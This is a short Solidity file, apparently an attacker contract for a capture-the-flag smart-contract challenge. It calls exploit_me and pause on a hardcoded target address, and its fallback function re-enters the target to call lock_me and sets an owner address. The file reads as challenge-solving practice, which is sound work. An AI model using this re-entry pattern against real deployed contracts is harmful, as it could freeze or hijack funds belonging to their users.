// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "./interface.sol";

contract challenge {
    address owner;
    constructor(){
    }
    function add() public{
        // Challenge(0x747Db1AFa235844b3A2384840194A96a613D102f).lock_me;
        Ichallenge(0x43f165eA17a8AB50a1e81b3451AC8b5156C1065e).exploit_me("");
        Ichallenge(0x43f165eA17a8AB50a1e81b3451AC8b5156C1065e).pause(true);
    }

    fallback() external{
        //  Ichallenge(0x747Db1AFa235844b3A2384840194A96a613D102f).pause(true);
        owner = 0xE6e2595f5f910c8A6c4cf42267Ca350c6BA8c054;
        Ichallenge(0x43f165eA17a8AB50a1e81b3451AC8b5156C1065e).lock_me();
    }
}